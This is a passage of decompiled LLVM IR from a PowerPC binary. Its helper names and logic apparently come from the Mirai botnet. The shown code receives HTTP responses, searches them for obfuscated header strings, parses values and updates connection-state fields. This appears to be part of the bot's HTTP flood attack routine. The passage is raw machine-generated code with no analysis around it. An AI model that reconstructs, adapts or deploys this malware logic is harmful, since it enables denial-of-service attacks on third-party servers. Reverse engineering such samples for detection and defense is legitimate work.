  %v3_10001704 = icmp eq i32 %v2_10001700, 0
  br i1 %v3_10001704, label %dec_label_pc_100021fc, label %dec_label_pc_1000170c

dec_label_pc_1000170c:                            ; preds = %dec_label_pc_100016f8
  %v1_1000170c = add i32 %v2_10001700, 2
  store i32 %v1_1000170c, i32* %r0.global-to-local, align 4
  %v1_10001710 = load i32, i32* @r30, align 4
  %v2_10001710 = add i32 %v1_10001710, 1464
  %v3_10001710 = inttoptr i32 %v2_10001710 to i32*
  store i32 %v1_1000170c, i32* %v3_10001710, align 4
  br label %dec_label_pc_10001584

dec_label_pc_10001718:                            ; preds = %dec_label_pc_10001070
  store i32 %v2_100010a0, i32* @r3, align 4
  %v0_1000171c = call i32 @__GI___libc_close()
  store i32 %v0_1000171c, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_10001724 = load i32, i32* @r30, align 4
  %v2_10001724 = inttoptr i32 %v1_10001724 to i32*
  store i32 -1, i32* %v2_10001724, align 4
  %v0_10001728 = load i32, i32* %r29.global-to-local, align 4
  %v1_10001728 = trunc i32 %v0_10001728 to i8
  %v2_10001728 = load i32, i32* @r30, align 4
  %v3_10001728 = add i32 %v2_10001728, 4
  %v4_10001728 = inttoptr i32 %v3_10001728 to i8*
  store i8 %v1_10001728, i8* %v4_10001728, align 1
  br label %dec_label_pc_10001038

dec_label_pc_10001730:                            ; preds = %dec_label_pc_1000101c
  store i32 %v2_10000a9c, i32* @r3, align 4
  store i32 10240, i32* @r4, align 4
  store i32 268441404, i32* @lr, align 4
  %v0_10001738 = call i32 @util_zero()
  store i32 %v0_10001738, i32* %r3.global-to-local, align 4
  %v0_1000173c = load i32, i32* @r30, align 4
  %v1_1000173c = inttoptr i32 %v0_1000173c to i32*
  %v2_1000173c = load i32, i32* %v1_1000173c, align 4
  store i32 %v2_1000173c, i32* %r3.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r4.global-to-local, align 4
  store i32 268441424, i32* @lr, align 4
  %v4_1000174c = call i32 @__libc_recv(i32 %v2_1000173c, i32 %v2_10000a9c, i32 10240, i32 16386)
  store i32 %v4_1000174c, i32* %r3.global-to-local, align 4
  store i32 %v4_1000174c, i32* %r25.global-to-local, align 4
  %tmp121 = icmp slt i32 %v4_1000174c, 1
  br i1 %tmp121, label %dec_label_pc_10001624, label %dec_label_pc_10001758

dec_label_pc_10001758:                            ; preds = %dec_label_pc_10001730
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r3.global-to-local, align 4
  store i32 %v4_1000174c, i32* %r4.global-to-local, align 4
  %v5_1000176c = call i32 @util_memsearch(i32 %v2_10000a9c, i32 %v4_1000174c, i32 ptrtoint ([5 x i8]* @global_var_100100e4.19 to i32), i32 4)
  store i32 %v5_1000176c, i32* %r3.global-to-local, align 4
  %v1_10001770 = icmp slt i32 %v5_1000176c, -1
  %v3_10001770 = icmp eq i32 %v5_1000176c, -1
  store i1 %v1_10001770, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001770, i1* %cr7_eq.global-to-local, align 1
  %v0_10001778 = load i32, i32* %r25.global-to-local, align 4
  br i1 %v3_10001770, label %dec_label_pc_10001778, label %dec_label_pc_10001780

dec_label_pc_10001778:                            ; preds = %dec_label_pc_10001758
  %v1_10001778 = icmp slt i32 %v0_10001778, 10239
  %v3_10001778 = icmp eq i32 %v0_10001778, 10239
  store i1 %v1_10001778, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001778, i1* %cr7_eq.global-to-local, align 1
  %tmp122 = icmp slt i32 %v0_10001778, 10240
  br i1 %tmp122, label %dec_label_pc_10001038, label %dec_label_pc_10001780

dec_label_pc_10001780:                            ; preds = %dec_label_pc_10001758, %dec_label_pc_10001778
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 %v0_10001778, i32* %r4.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r3.global-to-local, align 4
  %v5_10001794 = call i32 @util_memsearch(i32 %v2_10000a9c, i32 %v0_10001778, i32 ptrtoint ([5 x i8]* @global_var_100100e4.19 to i32), i32 4)
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000179c = load i32, i32* %r21.global-to-local, align 4
  %v2_1000179c = add i32 %v0_1000179c, %v5_10001794
  store i32 %v2_1000179c, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_100017a4 = add i32 %v2_1000179c, 10532
  %v4_100017a4 = inttoptr i32 %v3_100017a4 to i8*
  store i8 0, i8* %v4_100017a4, align 1
  store i32 53, i32* %r3.global-to-local, align 4
  %v3_100017ac = call i32 @table_retrieve_val(i32 53, i32* null)
  %v0_100017b0 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_100017b0, i32* %r4.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r3.global-to-local, align 4
  %v4_100017bc = call i32 @util_stristr(i8* %v3_100017bc, i32 %v0_100017b0, i32 %v3_100017ac)
  store i32 %v4_100017bc, i32* %r3.global-to-local, align 4
  %v1_100017c0 = icmp slt i32 %v4_100017bc, -1
  %v3_100017c0 = icmp eq i32 %v4_100017bc, -1
  store i1 %v1_100017c0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100017c0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100017c0, label %dec_label_pc_100017d0, label %dec_label_pc_100017c8

dec_label_pc_100017c8:                            ; preds = %dec_label_pc_10001780
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_100017cc = load i32, i32* @r30, align 4
  %v2_100017cc = add i32 %v1_100017cc, 1452
  %v3_100017cc = inttoptr i32 %v2_100017cc to i32*
  store i32 2, i32* %v3_100017cc, align 4
  br label %dec_label_pc_100017d0

dec_label_pc_100017d0:                            ; preds = %dec_label_pc_10001780, %dec_label_pc_100017c8
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v3_100017d8 = call i32 @table_retrieve_val(i32 52, i32* null)
  %v0_100017dc = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_100017dc, i32* %r4.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r3.global-to-local, align 4
  %v4_100017e8 = call i32 @util_stristr(i8* %v3_100017bc, i32 %v0_100017dc, i32 %v3_100017d8)
  store i32 %v4_100017e8, i32* %r3.global-to-local, align 4
  %v1_100017ec = icmp slt i32 %v4_100017e8, -1
  %v3_100017ec = icmp eq i32 %v4_100017e8, -1
  store i1 %v1_100017ec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100017ec, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100017ec, label %dec_label_pc_100017fc, label %dec_label_pc_100017f4

dec_label_pc_100017f4:                            ; preds = %dec_label_pc_100017d0
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_100017f8 = load i32, i32* @r30, align 4
  %v2_100017f8 = add i32 %v1_100017f8, 1452
  %v3_100017f8 = inttoptr i32 %v2_100017f8 to i32*
  store i32 1, i32* %v3_100017f8, align 4
  br label %dec_label_pc_100017fc

dec_label_pc_100017fc:                            ; preds = %dec_label_pc_100017d0, %dec_label_pc_100017f4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_10001804 = load i32, i32* @r30, align 4
  %v2_10001804 = add i32 %v1_10001804, 1456
  %v3_10001804 = inttoptr i32 %v2_10001804 to i32*
  store i32 0, i32* %v3_10001804, align 4
  store i32 51, i32* %r3.global-to-local, align 4
  %v3_1000180c = call i32 @table_retrieve_val(i32 51, i32* null)
  %v0_10001810 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10001810, i32* %r4.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r3.global-to-local, align 4
  %v4_1000181c = call i32 @util_stristr(i8* %v3_100017bc, i32 %v0_10001810, i32 %v3_1000180c)
  store i32 %v4_1000181c, i32* %r3.global-to-local, align 4
  %v1_10001820 = icmp slt i32 %v4_1000181c, -1
  %v3_10001820 = icmp eq i32 %v4_1000181c, -1
  store i1 %v1_10001820, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001820, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001820, label %dec_label_pc_100018cc, label %dec_label_pc_10001828

dec_label_pc_10001828:                            ; preds = %dec_label_pc_100017fc
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 51, i32* %r3.global-to-local, align 4
  %v3_10001830 = call i32 @table_retrieve_val(i32 51, i32* null)
  %v0_10001834 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10001834, i32* %r4.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r3.global-to-local, align 4
  %v4_10001840 = call i32 @util_stristr(i8* %v3_100017bc, i32 %v0_10001834, i32 %v3_10001830)
  store i32 %v4_10001840, i32* %r3.global-to-local, align 4
  %v0_10001844 = load i32, i32* %r16.global-to-local, align 4
  %v0_10001848 = load i32, i32* %r21.global-to-local, align 4
  %v2_10001848 = add i32 %v0_10001848, %v4_10001840
  store i32 %v2_10001848, i32* %r9.global-to-local, align 4
  %v1_10001850 = add i32 %v2_10001848, 10532
  %v2_10001850 = inttoptr i32 %v1_10001850 to i8*
  %v3_10001850 = load i8, i8* %v2_10001850, align 1
  %v4_10001850 = zext i8 %v3_10001850 to i32
  store i32 %v4_10001850, i32* %r0.global-to-local, align 4
  %v1_10001854 = xor i32 %v4_10001850, 32
  %v1_10001858 = sub nsw i32 0, %v1_10001854
  %v2_10001858 = xor i32 %v4_10001850, -33
  %v4_10001858 = icmp uge i32 %v2_10001858, %v1_10001858
  %v2_1000185c = zext i1 %v4_10001858 to i32
  %v3_1000185c = add i32 %v2_1000185c, %v4_10001840
  store i32 %v3_1000185c, i32* %r9.global-to-local, align 4
  %v0_10001860 = load i32, i32* %r20.global-to-local, align 4
  %v2_10001860 = add i32 %v3_1000185c, %v0_10001860
  store i32 %v2_10001860, i32* %r28.global-to-local, align 4
  store i32 %v2_10001860, i32* %r3.global-to-local, align 4
  %v1_10001868 = load i32, i32* %r25.global-to-local, align 4
  %v2_10001868 = sub i32 %v1_10001868, %v3_1000185c
  store i32 %v2_10001868, i32* %r4.global-to-local, align 4
  store i32 %v3_1000185c, i32* %r31.global-to-local, align 4
  %v4_10001870 = call i32 @util_memsearch(i32 %v2_10001860, i32 %v2_10001868, i32 %v0_10001844, i32 2)
  store i32 %v4_10001870, i32* %r3.global-to-local, align 4
  %v1_10001874 = icmp slt i32 %v4_10001870, -1
  %v3_10001874 = icmp eq i32 %v4_10001870, -1
  store i1 %v1_10001874, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001874, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001874, label %dec_label_pc_100018cc, label %dec_label_pc_1000187c

dec_label_pc_1000187c:                            ; preds = %dec_label_pc_10001828
  %v1_1000187c = icmp slt i32 %v4_10001870, 1
  %v3_1000187c = icmp eq i32 %v4_10001870, 1
  store i1 %v1_1000187c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000187c, i1* %cr7_eq.global-to-local, align 1
  %tmp123 = icmp slt i32 %v4_10001870, 2
  br i1 %tmp123, label %dec_label_pc_10001888, label %dec_label_pc_10001884

dec_label_pc_10001884:                            ; preds = %dec_label_pc_1000187c
  %v1_10001884 = add i32 %v4_10001870, -2
  store i32 %v1_10001884, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001888

dec_label_pc_10001888:                            ; preds = %dec_label_pc_1000187c, %dec_label_pc_10001884
  %v1_10001888 = phi i32 [ %v4_10001870, %dec_label_pc_1000187c ], [ %v1_10001884, %dec_label_pc_10001884 ]
  %v0_10001888 = load i32, i32* %r21.global-to-local, align 4
  %v2_10001888 = add i32 %v0_10001888, %v1_10001888
  %v0_1000188c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000188c, i32* %r3.global-to-local, align 4
  %v1_10001890 = load i32, i32* %r31.global-to-local, align 4
  %v2_10001890 = add i32 %v2_10001888, %v1_10001890
  store i32 %v2_10001890, i32* %r9.global-to-local, align 4
  %v0_10001894 = load i32, i32* %r29.global-to-local, align 4
  %v1_10001894 = trunc i32 %v0_10001894 to i8
  %v3_10001894 = add i32 %v2_10001890, 10532
  %v4_10001894 = inttoptr i32 %v3_10001894 to i8*
  store i8 %v1_10001894, i8* %v4_10001894, align 1
  store i32 268441756, i32* @lr, align 4
  %v1_10001898 = inttoptr i32 %v0_1000188c to i8*
  %v2_10001898 = call i32 @util_strlen(i8* %v1_10001898)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_10001898, i32* %r29.global-to-local, align 4
  store i32 50, i32* %r3.global-to-local, align 4
  %v3_100018a8 = call i32 @table_retrieve_val(i32 50, i32* null)
  %v0_100018ac = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100018ac, i32* %r4.global-to-local, align 4
  %v0_100018b4 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100018b4, i32* %r3.global-to-local, align 4
  %v3_100018b8 = inttoptr i32 %v0_100018b4 to i8*
  %v4_100018b8 = call i32 @util_stristr(i8* %v3_100018b8, i32 %v0_100018ac, i32 %v3_100018a8)
  store i32 %v4_100018b8, i32* %r3.global-to-local, align 4
  %v1_100018bc = icmp slt i32 %v4_100018b8, 0
  %v3_100018bc = icmp eq i32 %v4_100018b8, 0
  store i1 %v1_100018bc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100018bc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100018bc, label %dec_label_pc_100018cc, label %dec_label_pc_100018c4

dec_label_pc_100018c4:                            ; preds = %dec_label_pc_10001888
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_100018c8 = load i32, i32* @r30, align 4
  %v2_100018c8 = add i32 %v1_100018c8, 1456
  %v3_100018c8 = inttoptr i32 %v2_100018c8 to i32*
  store i32 1, i32* %v3_100018c8, align 4
  br label %dec_label_pc_100018cc

dec_label_pc_100018cc:                            ; preds = %dec_label_pc_10001888, %dec_label_pc_10001828, %dec_label_pc_100017fc, %dec_label_pc_100018c4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_100018d4 = load i32, i32* @r30, align 4
  %v2_100018d4 = add i32 %v1_100018d4, 1460
  %v3_100018d4 = inttoptr i32 %v2_100018d4 to i32*
  store i32 0, i32* %v3_100018d4, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  %v3_100018dc = call i32 @table_retrieve_val(i32 48, i32* null)
  %v0_100018e0 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_100018e0, i32* %r4.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r3.global-to-local, align 4
  %v4_100018ec = call i32 @util_stristr(i8* %v3_100017bc, i32 %v0_100018e0, i32 %v3_100018dc)
  store i32 %v4_100018ec, i32* %r3.global-to-local, align 4
  %v1_100018f0 = icmp slt i32 %v4_100018ec, -1
  %v3_100018f0 = icmp eq i32 %v4_100018ec, -1
  store i1 %v1_100018f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100018f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100018f0, label %dec_label_pc_1000199c, label %dec_label_pc_100018f8

dec_label_pc_100018f8:                            ; preds = %dec_label_pc_100018cc
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  %v3_10001900 = call i32 @table_retrieve_val(i32 48, i32* null)
  %v0_10001904 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10001904, i32* %r4.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r3.global-to-local, align 4
  %v4_10001910 = call i32 @util_stristr(i8* %v3_100017bc, i32 %v0_10001904, i32 %v3_10001900)
  store i32 %v4_10001910, i32* %r3.global-to-local, align 4
  %v0_10001914 = load i32, i32* %r16.global-to-local, align 4
  %v0_10001918 = load i32, i32* %r21.global-to-local, align 4
  %v2_10001918 = add i32 %v0_10001918, %v4_10001910
  store i32 %v2_10001918, i32* %r9.global-to-local, align 4
  %v1_10001920 = add i32 %v2_10001918, 10532
  %v2_10001920 = inttoptr i32 %v1_10001920 to i8*
  %v3_10001920 = load i8, i8* %v2_10001920, align 1
  %v4_10001920 = zext i8 %v3_10001920 to i32
  store i32 %v4_10001920, i32* %r0.global-to-local, align 4
  %v1_10001924 = xor i32 %v4_10001920, 32
  %v1_10001928 = sub nsw i32 0, %v1_10001924
  %v2_10001928 = xor i32 %v4_10001920, -33
  %v4_10001928 = icmp uge i32 %v2_10001928, %v1_10001928
  %v2_1000192c = zext i1 %v4_10001928 to i32
  %v3_1000192c = add i32 %v2_1000192c, %v4_10001910
  store i32 %v3_1000192c, i32* %r9.global-to-local, align 4
  %v0_10001930 = load i32, i32* %r20.global-to-local, align 4
  %v2_10001930 = add i32 %v3_1000192c, %v0_10001930
  store i32 %v2_10001930, i32* %r28.global-to-local, align 4
  store i32 %v2_10001930, i32* %r3.global-to-local, align 4
  %v1_10001938 = load i32, i32* %r25.global-to-local, align 4
  %v2_10001938 = sub i32 %v1_10001938, %v3_1000192c
  store i32 %v2_10001938, i32* %r4.global-to-local, align 4
  store i32 %v3_1000192c, i32* %r31.global-to-local, align 4
  %v4_10001940 = call i32 @util_memsearch(i32 %v2_10001930, i32 %v2_10001938, i32 %v0_10001914, i32 2)
  store i32 %v4_10001940, i32* %r3.global-to-local, align 4
  %v1_10001944 = icmp slt i32 %v4_10001940, -1
  %v3_10001944 = icmp eq i32 %v4_10001940, -1
  store i1 %v1_10001944, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001944, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001944, label %dec_label_pc_1000199c, label %dec_label_pc_1000194c

dec_label_pc_1000194c:                            ; preds = %dec_label_pc_100018f8
  %v1_1000194c = icmp slt i32 %v4_10001940, 1
  %v3_1000194c = icmp eq i32 %v4_10001940, 1
  store i1 %v1_1000194c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000194c, i1* %cr7_eq.global-to-local, align 1
  %tmp124 = icmp slt i32 %v4_10001940, 2
  br i1 %tmp124, label %dec_label_pc_10001958, label %dec_label_pc_10001954

dec_label_pc_10001954:                            ; preds = %dec_label_pc_1000194c
  %v1_10001954 = add i32 %v4_10001940, -2
  store i32 %v1_10001954, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001958

dec_label_pc_10001958:                            ; preds = %dec_label_pc_1000194c, %dec_label_pc_10001954
  %v1_10001958 = phi i32 [ %v4_10001940, %dec_label_pc_1000194c ], [ %v1_10001954, %dec_label_pc_10001954 ]
  %v0_10001958 = load i32, i32* %r21.global-to-local, align 4
  %v2_10001958 = add i32 %v0_10001958, %v1_10001958
  %v0_1000195c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000195c, i32* %r3.global-to-local, align 4
  %v1_10001960 = load i32, i32* %r31.global-to-local, align 4
  %v2_10001960 = add i32 %v2_10001958, %v1_10001960
  store i32 %v2_10001960, i32* %r9.global-to-local, align 4
  %v0_10001964 = load i32, i32* %r29.global-to-local, align 4
  %v1_10001964 = trunc i32 %v0_10001964 to i8
  %v3_10001964 = add i32 %v2_10001960, 10532
  %v4_10001964 = inttoptr i32 %v3_10001964 to i8*
  store i8 %v1_10001964, i8* %v4_10001964, align 1
  store i32 268441964, i32* @lr, align 4
  %v1_10001968 = inttoptr i32 %v0_1000195c to i8*
  %v2_10001968 = call i32 @util_strlen(i8* %v1_10001968)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_10001968, i32* %r29.global-to-local, align 4
  store i32 49, i32* %r3.global-to-local, align 4
  %v3_10001978 = call i32 @table_retrieve_val(i32 49, i32* null)
  %v0_1000197c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000197c, i32* %r4.global-to-local, align 4
  %v0_10001984 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10001984, i32* %r3.global-to-local, align 4
  %v3_10001988 = inttoptr i32 %v0_10001984 to i8*
  %v4_10001988 = call i32 @util_stristr(i8* %v3_10001988, i32 %v0_1000197c, i32 %v3_10001978)
  store i32 %v4_10001988, i32* %r3.global-to-local, align 4
  %v1_1000198c = icmp slt i32 %v4_10001988, 0
  %v3_1000198c = icmp eq i32 %v4_10001988, 0
  store i1 %v1_1000198c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000198c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000198c, label %dec_label_pc_1000199c, label %dec_label_pc_10001994

dec_label_pc_10001994:                            ; preds = %dec_label_pc_10001958
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10001998 = load i32, i32* @r30, align 4
  %v2_10001998 = add i32 %v1_10001998, 1460
  %v3_10001998 = inttoptr i32 %v2_10001998 to i32*
  store i32 1, i32* %v3_10001998, align 4
  br label %dec_label_pc_1000199c

dec_label_pc_1000199c:                            ; preds = %dec_label_pc_10001958, %dec_label_pc_100018f8, %dec_label_pc_100018cc, %dec_label_pc_10001994
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v3_100019a4 = call i32 @table_retrieve_val(i32 47, i32* null)
  %v0_100019a8 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_100019a8, i32* %r4.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r3.global-to-local, align 4
  %v4_100019b4 = call i32 @util_stristr(i8* %v3_100017bc, i32 %v0_100019a8, i32 %v3_100019a4)
  store i32 %v4_100019b4, i32* %r3.global-to-local, align 4
  %v1_100019b8 = icmp slt i32 %v4_100019b4, -1
  %v3_100019b8 = icmp eq i32 %v4_100019b4, -1
  store i1 %v1_100019b8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100019b8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100019b8, label %dec_label_pc_10001fe0, label %dec_label_pc_100019c0

dec_label_pc_100019c0:                            ; preds = %dec_label_pc_1000199c
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v3_100019c8 = call i32 @table_retrieve_val(i32 47, i32* null)
  %v0_100019cc = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_100019cc, i32* %r4.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r3.global-to-local, align 4
  %v4_100019d8 = call i32 @util_stristr(i8* %v3_100017bc, i32 %v0_100019cc, i32 %v3_100019c8)
  store i32 %v4_100019d8, i32* %r3.global-to-local, align 4
  %v0_100019dc = load i32, i32* %r16.global-to-local, align 4
  %v0_100019e0 = load i32, i32* %r21.global-to-local, align 4
  %v2_100019e0 = add i32 %v0_100019e0, %v4_100019d8
  store i32 %v2_100019e0, i32* %r9.global-to-local, align 4
  %v1_100019e8 = add i32 %v2_100019e0, 10532
  %v2_100019e8 = inttoptr i32 %v1_100019e8 to i8*
  %v3_100019e8 = load i8, i8* %v2_100019e8, align 1
  %v4_100019e8 = zext i8 %v3_100019e8 to i32
  store i32 %v4_100019e8, i32* %r0.global-to-local, align 4
  %v1_100019ec = xor i32 %v4_100019e8, 32
  %v1_100019f0 = sub nsw i32 0, %v1_100019ec
  %v2_100019f0 = xor i32 %v4_100019e8, -33
  %v4_100019f0 = icmp uge i32 %v2_100019f0, %v1_100019f0
  %v2_100019f4 = zext i1 %v4_100019f0 to i32
  %v3_100019f4 = add i32 %v2_100019f4, %v4_100019d8
  store i32 %v3_100019f4, i32* %r9.global-to-local, align 4
  %v0_100019f8 = load i32, i32* %r20.global-to-local, align 4
  %v2_100019f8 = add i32 %v3_100019f4, %v0_100019f8
  store i32 %v2_100019f8, i32* %r29.global-to-local, align 4
  store i32 %v2_100019f8, i32* %r3.global-to-local, align 4
  %v1_10001a00 = load i32, i32* %r25.global-to-local, align 4
  %v2_10001a00 = sub i32 %v1_10001a00, %v3_100019f4
  store i32 %v2_10001a00, i32* %r4.global-to-local, align 4
  store i32 %v3_100019f4, i32* %r31.global-to-local, align 4
  %v4_10001a08 = call i32 @util_memsearch(i32 %v2_100019f8, i32 %v2_10001a00, i32 %v0_100019dc, i32 2)
  store i32 %v4_10001a08, i32* %r3.global-to-local, align 4
  %v1_10001a0c = icmp slt i32 %v4_10001a08, -1
  %v3_10001a0c = icmp eq i32 %v4_10001a08, -1
  store i1 %v1_10001a0c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001a0c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001a0c, label %dec_label_pc_10001a40, label %dec_label_pc_10001a14

dec_label_pc_10001a14:                            ; preds = %dec_label_pc_100019c0
  %v1_10001a14 = icmp slt i32 %v4_10001a08, 1
  %v3_10001a14 = icmp eq i32 %v4_10001a08, 1
  store i1 %v1_10001a14, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001a14, i1* %cr7_eq.global-to-local, align 1
  %tmp125 = icmp slt i32 %v4_10001a08, 2
  br i1 %tmp125, label %dec_label_pc_10001a20, label %dec_label_pc_10001a1c

dec_label_pc_10001a1c:                            ; preds = %dec_label_pc_10001a14
  %v1_10001a1c = add i32 %v4_10001a08, -2
  store i32 %v1_10001a1c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001a20

dec_label_pc_10001a20:                            ; preds = %dec_label_pc_10001a14, %dec_label_pc_10001a1c
  %v1_10001a20 = phi i32 [ %v4_10001a08, %dec_label_pc_10001a14 ], [ %v1_10001a1c, %dec_label_pc_10001a1c ]
  %v0_10001a20 = load i32, i32* %r21.global-to-local, align 4
  %v2_10001a20 = add i32 %v0_10001a20, %v1_10001a20
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10001a28 = load i32, i32* %r31.global-to-local, align 4
  %v2_10001a28 = add i32 %v2_10001a20, %v1_10001a28
  store i32 %v2_10001a28, i32* %r9.global-to-local, align 4
  %v0_10001a2c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001a2c, i32* @r3, align 4
  %v3_10001a30 = add i32 %v2_10001a28, 10532
  %v4_10001a30 = inttoptr i32 %v3_10001a30 to i8*
  store i8 0, i8* %v4_10001a30, align 1
  store i32 10, i32* %r4.global-to-local, align 4
  store i32 268442172, i32* @lr, align 4
  %v2_10001a38 = call i32 @util_atoi(i32 %v0_10001a2c, i32 10)
  store i32 %v2_10001a38, i32* %r3.global-to-local, align 4
  %v1_10001a3c = load i32, i32* @r30, align 4
  %v2_10001a3c = add i32 %v1_10001a3c, 1464
  %v3_10001a3c = inttoptr i32 %v2_10001a3c to i32*
  store i32 %v2_10001a38, i32* %v3_10001a3c, align 4
  br label %dec_label_pc_10001a40

dec_label_pc_10001a40:                            ; preds = %dec_label_pc_100019c0, %dec_label_pc_10001fe0, %dec_label_pc_10001a20
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 46, i32* %r3.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r31.global-to-local, align 4
  %v3_10001a50 = call i32 @table_retrieve_val(i32 46, i32* null)
  %v0_10001a54 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10001a54, i32* %r4.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r3.global-to-local, align 4
  %v4_10001a60 = call i32 @util_stristr(i8* %v3_100017bc, i32 %v0_10001a54, i32 %v3_10001a50)
  store i32 %v4_10001a60, i32* %r3.global-to-local, align 4
  %v1_10001a64 = icmp slt i32 %v4_10001a60, -1
  %v3_10001a64 = icmp eq i32 %v4_10001a60, -1
  store i1 %v1_10001a64, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001a64, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001a64, label %dec_label_pc_10001b9c, label %dec_label_pc_10001a6c

dec_label_pc_10001a6c:                            ; preds = %dec_label_pc_10001a40, %dec_label_pc_10001b74
  %v0_10001a6c = load i32, i32* @r30, align 4
  %v1_10001a6c = add i32 %v0_10001a6c, 1468
  %v2_10001a6c = inttoptr i32 %v1_10001a6c to i32*
  %v3_10001a6c = load i32, i32* %v2_10001a6c, align 4
  store i32 %v3_10001a6c, i32* %r0.global-to-local, align 4
  %v1_10001a70 = icmp slt i32 %v3_10001a6c, 4
  %v2_10001a70 = icmp sgt i32 %v3_10001a6c, 4
  %v3_10001a70 = icmp eq i32 %v3_10001a6c, 4
  store i1 %v1_10001a70, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001a70, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001a70, label %dec_label_pc_10001b9c, label %dec_label_pc_10001a78

dec_label_pc_10001a78:                            ; preds = %dec_label_pc_10001a6c
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 46, i32* %r3.global-to-local, align 4
  %v3_10001a80 = call i32 @table_retrieve_val(i32 46, i32* null)
  %v0_10001a84 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10001a84, i32* %r4.global-to-local, align 4
  %v0_10001a8c = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10001a8c, i32* %r3.global-to-local, align 4
  %v3_10001a90 = inttoptr i32 %v0_10001a8c to i8*
  %v4_10001a90 = call i32 @util_stristr(i8* %v3_10001a90, i32 %v0_10001a84, i32 %v3_10001a80)
  store i32 %v4_10001a90, i32* %r3.global-to-local, align 4
  %v1_10001a94 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001a94 = add i32 %v1_10001a94, %v4_10001a90
  store i32 %v2_10001a94, i32* %r26.global-to-local, align 4
  %v0_10001a98 = load i32, i32* %r21.global-to-local, align 4
  %v2_10001a98 = add i32 %v0_10001a98, %v2_10001a94
